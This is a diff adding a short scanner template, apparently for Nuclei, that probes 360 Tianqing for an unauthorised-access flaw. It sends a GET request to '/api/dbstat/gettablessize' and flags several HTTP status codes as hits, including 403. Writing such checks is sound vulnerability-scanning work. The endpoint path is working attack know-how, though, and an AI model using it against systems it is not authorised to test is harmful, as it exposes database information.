@@ -1,0 +1,18 @@
+id: 360---------------
+info:
+  author: pocscanner
+  description: 360天擎 存在未授权越权访问，造成敏感信息泄露
+  name: 360天擎 越权访问/数据库信息泄露
+  reference: []
+  severity: high
+requests:
+- matchers:
+  - status:
+    - 200
+    - 301
+    - 302
+    - 403
+    type: status
+  method: GET
+  path:
+  - '{{BaseURL}}/api/dbstat/gettablessize'
